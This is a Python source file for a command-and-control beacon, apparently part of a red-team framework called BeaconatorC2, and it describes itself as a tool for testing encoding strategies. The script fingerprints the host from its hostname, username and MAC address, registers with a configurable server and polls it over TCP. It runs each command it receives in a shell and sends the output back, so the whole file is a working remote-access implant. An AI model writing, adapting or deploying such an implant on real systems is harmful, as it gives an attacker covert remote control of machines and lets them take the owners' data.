#!/usr/bin/env python3
"""
Simple Python Beacon for BeaconatorC2 Encoding Strategy Testing
TCP-only beacon with configurable encoding (plaintext/base64)
Designed for testing receiver encoding strategy implementations
"""

import socket
import subprocess
import time
import hashlib
import platform
import uuid
import os
import sys
import argparse
import base64


class SimplePythonBeacon:
    def __init__(self, server_ip="127.0.0.1", server_port=5074, encoding="plaintext"):
        self.server_ip = server_ip
        self.server_port = server_port
        self.encoding = encoding.lower()
        
        self.beacon_id = self.generate_beacon_id()
        self.computer_name = platform.node()
        self.check_in_interval = 15  # seconds
        self.is_running = False
        
        print(f"[+] Simple Python Beacon initialized")
        print(f"    Beacon ID: {self.beacon_id}")
        print(f"    Computer: {self.computer_name}")
        print(f"    Server: {self.server_ip}:{self.server_port}")
        print(f"    Encoding: {self.encoding.upper()}")

    def generate_beacon_id(self):
        """Generate unique beacon ID based on system information"""
        system_info = f"{platform.node()}{platform.system()}"
        
        # Add username (with fallback)
        try:
            username = os.getlogin()
        except:
            try:
                username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
            except:
                username = 'unknown'
        system_info += username
        
        # Add MAC address
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,2*6,2)][::-1])
            system_info += mac
        except:
            pass
            
        # Add script path
        system_info += os.path.abspath(__file__)
        
        # Generate hash
        return hashlib.md5(system_info.encode()).hexdigest()[:8]

    def log(self, message):
        """Simple logging function"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")

    def encode_message(self, message):
        """Encode message based on configured encoding strategy"""
        if self.encoding == "base64":
            # Convert to bytes, encode with base64, then back to string
            message_bytes = message.encode('utf-8')
            encoded_bytes = base64.b64encode(message_bytes)
            return encoded_bytes.decode('utf-8')
        else:
            # Plaintext - no encoding
            return message

    def decode_message(self, message):
        """Decode message based on configured encoding strategy"""
        if self.encoding == "base64":
            try:
                # Convert to bytes, decode from base64, then back to string
                message_bytes = message.encode('utf-8')
                decoded_bytes = base64.b64decode(message_bytes)
                return decoded_bytes.decode('utf-8')
            except Exception as e:
                self.log(f"Base64 decode error: {e}, treating as plaintext")
                return message
        else:
            # Plaintext - no decoding
            return message

    def send_tcp_message(self, message, expect_response=True):
        """Send message via TCP with encoding"""
        try:
            # Apply encoding
            encoded_message = self.encode_message(message)
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_ip, self.server_port))
            
            # Send encoded message
            sock.send(encoded_message.encode('utf-8'))
            
            if expect_response:
                # Receive response and decode it based on encoding strategy
                response = sock.recv(4096).decode('utf-8').strip()
                if self.encoding == "base64":
                    self.log(f"Received encoded response: {response}")
                decoded_response = self.decode_message(response)
                if self.encoding == "base64":
                    self.log(f"Decoded response: {decoded_response}")
                sock.close()
                return decoded_response
            else:
                sock.close()
                return "OK"
                
        except Exception as e:
            self.log(f"TCP Error: {e}")
            return f"ERROR: {e}"

    def register(self):
        """Register beacon with server"""
        message = f"register|{self.beacon_id}|{self.computer_name}"
        self.log(f"Registering with message: {message}")
        if self.encoding == "base64":
            self.log(f"Encoded message: {self.encode_message(message)}")
        response = self.send_tcp_message(message)
        self.log(f"Registration response: {response}")
        return response

    def request_action(self):
        """Request pending action from server"""
        message = f"request_action|{self.beacon_id}"
        self.log(f"Requesting action: {message}")
        if self.encoding == "base64":
            self.log(f"Encoded message: {self.encode_message(message)}")
        response = self.send_tcp_message(message)
        self.log(f"Action response: {response}")
        return response

    def execute_command(self, command):
        """Execute system command"""
        try:
            self.log(f"Executing: {command}")
            
            # Execute command
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=300
            )
            
            # Combine stdout and stderr
            output = ""
            if result.stdout:
                output += f"STDOUT:\n{result.stdout}\n"
            if result.stderr:
                output += f"STDERR:\n{result.stderr}\n"
            if not output:
                output = f"Command executed (exit code: {result.returncode})"
                
            return output.strip()
            
        except subprocess.TimeoutExpired:
            return "ERROR: Command timeout (300s)"
        except Exception as e:
            return f"ERROR: {e}"

    def send_command_output(self, output):
        """Send command output to server"""
        message = f"command_output|{self.beacon_id}|{output}"
        self.log(f"Sending command output: {len(output)} characters")
        if self.encoding == "base64":
            self.log(f"Encoded message length: {len(self.encode_message(message))} characters")
        response = self.send_tcp_message(message, expect_response=False)
        return response

    def process_command(self, command_data):
        """Process command from server"""
        try:
            # Check for standard "no command" responses from server
            no_command_responses = [
                "", 
                "No commands queued", 
                "no_pending_commands",
                "No pending commands"
            ]
            
            if not command_data or command_data in no_command_responses:
                return None
                
            self.log(f"Processing: {command_data}")
            
            # Handle different command types
            if command_data.startswith("execute_command|"):
                _, cmd = command_data.split("|", 1)
                output = self.execute_command(cmd)
                self.send_command_output(output)
            elif "|" not in command_data:
                # Simple command execution
                output = self.execute_command(command_data)
                self.send_command_output(output)
            else:
                self.log(f"Unknown command format: {command_data}")
                
        except Exception as e:
            self.log(f"Error processing command: {e}")
            self.send_command_output(f"ERROR: {e}")

    def run(self):
        """Main beacon loop"""
        self.log("Starting simple beacon...")
        
        # Initial registration
        self.register()
        self.is_running = True
        
        try:
            while self.is_running:
                try:
                    # Request action from server
                    self.log("Starting beacon cycle...")
                    action = self.request_action()
                    
                    if action and not action.startswith("ERROR"):
                        self.process_command(action)
                    elif action and action.startswith("ERROR"):
                        self.log(f"Communication error: {action}")
                        self.log("Will retry in next cycle...")
                    
                    # Wait before next cycle
                    self.log(f"Waiting {self.check_in_interval} seconds before next cycle...")
                    time.sleep(self.check_in_interval)
                    
                except KeyboardInterrupt:
                    self.log("Beacon interrupted by user")
                    break
                except Exception as e:
                    self.log(f"Beacon error: {e}")
                    time.sleep(5)  # Wait before retry
                    
        except Exception as e:
            self.log(f"Fatal beacon error: {e}")
        finally:
            self.is_running = False
            self.log("Simple beacon stopped")


def main():
    parser = argparse.ArgumentParser(description="Simple Python Beacon for BeaconatorC2 Encoding Testing")
    parser.add_argument("--server", default="127.0.0.1", help="Server IP address")
    parser.add_argument("--port", type=int, default=5074, help="Server port")
    parser.add_argument("--encoding", choices=["plaintext", "base64"], default="plaintext", 
                       help="Encoding strategy (plaintext or base64)")
    parser.add_argument("--interval", type=int, default=15, help="Check-in interval in seconds")
    
    args = parser.parse_args()
    
    # Validate encoding
    if args.encoding not in ["plaintext", "base64"]:
        print(f"[!] Invalid encoding: {args.encoding}. Must be 'plaintext' or 'base64'")
        sys.exit(1)
    
    # Create and run beacon
    beacon = SimplePythonBeacon(
        server_ip=args.server,
        server_port=args.port,
        encoding=args.encoding
    )
    
    beacon.check_in_interval = args.interval
    
    try:
        beacon.run()
    except KeyboardInterrupt:
        print("\n[!] Beacon terminated by user")
    except Exception as e:
        print(f"[!] Beacon failed: {e}")


if __name__ == "__main__":
    main()